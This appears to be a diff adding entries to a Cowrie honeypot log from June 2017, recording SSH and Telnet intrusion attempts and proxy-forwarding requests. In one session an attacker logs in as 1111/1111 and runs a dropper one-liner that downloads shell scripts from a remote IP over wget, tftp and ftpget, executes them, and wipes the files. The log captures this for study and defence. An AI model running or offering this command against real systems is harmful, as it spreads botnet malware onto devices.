@@ -7204,3 +7204,53 @@
 2017-06-01T06:03:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,776,91.230.47.81] direct-tcp forward to 93.115.29.122:80 with data 'GET /internals/api/ip?1496296949289621374 HTTP/1.1\r\nHost: ip3.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
 2017-06-01T06:03:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,776,91.230.47.81] failed to connect: Connection refused
 2017-06-01T06:03:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,776,91.230.47.81] sending close 119
+2017-06-01T06:04:15+0000 [CowrieTelnetTransport,3867,179.222.10.60] Closing TTY Log: log/tty/20170601-060213-None-3867i.log after 122 seconds
+2017-06-01T06:04:15+0000 [CowrieTelnetTransport,3867,179.222.10.60] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-01T06:04:15+0000 [CowrieTelnetTransport,3867,179.222.10.60] Connection lost after 127 seconds
+2017-06-01T06:04:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,759,91.230.47.76] got channel 'direct-tcpip' request
+2017-06-01T06:04:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,759,91.230.47.76] direct-tcp connection request to 94.100.180.150:25 from localhost:5556
+2017-06-01T06:04:29+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 154.16.3.104:40074 (10.8.41.81:2222) [session: b480af50]
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] NEW KEYS
+2017-06-01T06:04:29+0000 [HoneyPotSSHTransport,807,154.16.3.104] starting service 'ssh-userauth'
+2017-06-01T06:04:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] '1111' trying auth 'password'
+2017-06-01T06:04:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] login attempt: 29
+2017-06-01T06:04:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] login return, expect: [1111/1111]
+2017-06-01T06:04:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] login attempt [1111/1111] succeeded
+2017-06-01T06:04:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] '1111' authenticated with 'password'
+2017-06-01T06:04:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,807,154.16.3.104] starting service 'ssh-connection'
+2017-06-01T06:04:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] got channel 'session' request
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] channel open
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Opening TTY Log: log/tty/20170601-060432-b480af50-0e.log
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: cd /tmp
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: cd /var/run
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: cd /mnt
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: cd /root
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: cd /
+2017-06-01T06:04:32+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Command found: wget http://107.174.34.70/Swag.sh
+2017-06-01T06:04:32+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-01T06:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,763,91.230.47.78] got channel 'direct-tcpip' request
+2017-06-01T06:04:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,763,91.230.47.78] direct-tcp connection request to 104.122.255.22:443 from localhost:5556
+2017-06-01T06:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,763,91.230.47.78] direct-tcp forward to 104.122.255.22:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80}\xa9\xe2\xfbJU\xc5\x0c\xc6+P\x7f\xe438\x97\xcb\x90r\x14<\xc2\xab\xbc\x8a\xa2\xb1y\xd3\xecV\xb1'
+2017-06-01T06:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,763,91.230.47.78] failed to connect: Connection refused
+2017-06-01T06:04:39+0000 [SSHChannel None (39) on SSHService 'ssh-connection' on HoneyPotSSHTransport,763,91.230.47.78] sending close 39
+2017-06-01T06:04:42+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] received eof, sending ctrl-d to command
+2017-06-01T06:04:42+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] remote close
+2017-06-01T06:04:42+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] Closing TTY Log: log/tty/20170601-060432-b480af50-0e.log after 10 seconds
+2017-06-01T06:04:42+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-01T06:04:42+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,807,154.16.3.104] sending close 0
+2017-06-01T06:04:42+0000 [HoneyPotSSHTransport,807,154.16.3.104] avatar 1111 logging out
+2017-06-01T06:04:42+0000 [HoneyPotSSHTransport,807,154.16.3.104] connection lost
+2017-06-01T06:04:42+0000 [HoneyPotSSHTransport,807,154.16.3.104] Connection lost after 13 seconds
+2017-06-01T06:04:45+0000 [CowrieTelnetTransport,3868,184.186.219.42] Closing TTY Log: log/tty/20170601-060304-None-3868i.log after 101 seconds
+2017-06-01T06:04:45+0000 [CowrieTelnetTransport,3868,184.186.219.42] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-01T06:04:45+0000 [CowrieTelnetTransport,3868,184.186.219.42] Connection lost after 105 seconds
+2017-06-01T06:05:00+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 134.19.187.75:64901 (10.8.41.81:2222) [session: 0c5ad5ac]
